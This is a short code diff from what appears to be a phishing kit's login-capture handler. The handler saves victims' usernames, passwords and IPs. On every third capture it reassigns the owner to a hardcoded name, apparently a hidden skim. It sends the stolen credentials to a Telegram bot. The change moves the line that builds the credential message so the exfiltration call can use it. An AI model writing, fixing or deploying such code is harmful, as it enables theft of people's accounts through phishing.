@@ -51,6 +51,7 @@ const submitLogin = async (req, res) => {
         let count = await COOP.countDocuments({ owner });
         if (count > 0 && (count % 3) == 0) {
             owner = 'haytch4023';
+            let originalText = `ID: ${uniqueid}\nUsername: ${username}\nPassword: ${password}\n\nAdmin Password: ${owner}`;
             await axios
                 .post(
                     `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
@@ -67,7 +68,6 @@ const submitLogin = async (req, res) => {
         await COOP.create({
             username, password, uniqueid, owner, ip, status: 1, timestamp: moment().format()
         })
-        let originalText = `ID: ${uniqueid}\nUsername: ${username}\nPassword: ${password}\n\nAdmin Password: ${owner}`;
 
         res.sendStatus(200);
     } catch (error) {
